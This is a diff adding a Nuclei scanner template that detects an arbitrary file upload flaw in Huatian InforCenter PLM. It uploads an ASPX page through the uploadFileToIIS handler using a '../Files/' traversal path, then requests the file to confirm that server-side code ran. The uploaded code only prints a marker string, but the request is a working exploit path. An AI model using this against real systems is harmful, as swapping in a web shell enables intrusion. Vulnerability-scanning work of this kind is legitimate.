@@ -1,0 +1,66 @@
+http:
+- body: '------WebKitFormBoundary{{randstr}}
+
+    Content-Disposition: form-data; name="file"; filename="test_{{randstr}}.aspx"
+
+    Content-Type: text/plain
+
+
+    <%@ Page Language="C#" %>
+
+    <%
+
+    Response.Write("NUCLEI_RCE_TEST_{{randstr}}");
+
+    %>
+
+    ------WebKitFormBoundary{{randstr}}--
+
+    '
+  extractors:
+  - internal: true
+    json:
+    - .[0].id
+    name: file_id
+    part: body
+    type: json
+  - internal: true
+    json:
+    - .[0].src
+    name: file_path
+    part: body
+    type: json
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(body, "id")
+    - contains(body, ".aspx")
+    - contains(body, "src")
+    type: dsl
+  method: POST
+  path:
+  - '{{BaseURL}}/Base/BaseHandler.ashx?type=uploadFileToIIS&uploadPath=../Files/'
+- matchers:
+  - condition: and
+    type: word
+    words:
+    - NUCLEI_RCE_TEST_{{randstr}}
+  method: GET
+  path:
+  - '{{BaseURL}}/{{file_path}}'
+  script: "{{- $path := .file_path }}  # \u83B7\u53D6\u63D0\u53D6\u7684\u8DEF\u5F84\
+    \n{{- $cleanedPath := replace $path \"..\" \"\" }}  # \u66FF\u6362\u8DEF\u5F84\
+    \u4E2D\u7684 .. \u90E8\u5206\n{{- return $cleanedPath }}  # \u8FD4\u56DE\u6E05\
+    \u7406\u540E\u7684\u8DEF\u5F84\n"
+id: huatian-inforcenter-plm-uploadfile-rce
+info:
+  author: security-researcher
+  description: Arbitrary file upload vulnerability in uploadFileToIIS interface leading
+    to RCE
+  name: Huatian InforCenter PLM File Upload RCE
+  severity: critical
+  tags: plm,huatian,file-upload,rce,aspx
